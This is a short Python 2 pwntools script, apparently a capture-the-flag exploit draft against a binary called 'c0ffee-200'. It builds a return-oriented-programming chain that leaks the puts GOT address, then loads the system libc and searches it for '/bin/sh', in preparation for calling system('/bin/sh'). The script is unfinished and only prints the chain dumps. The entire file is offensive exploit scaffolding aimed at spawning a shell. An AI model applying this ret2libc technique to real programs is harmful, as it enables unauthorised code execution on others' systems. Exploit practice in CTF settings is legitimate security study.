from pwn import *

elf = ELF('./c0ffee-200')
rop = ROP(elf)
#libc = ELF('libc-2.23.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')


rop.puts(elf.got['puts'])
rop.call(elf.symbols['atoi'])
print rop.dump()
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
print "bin sh",next(libc.search('/bin/sh\x00'))
log.info(libc.search('/bin/sh\x00'))
log.info("ROP 2:")

print rop2.dump()

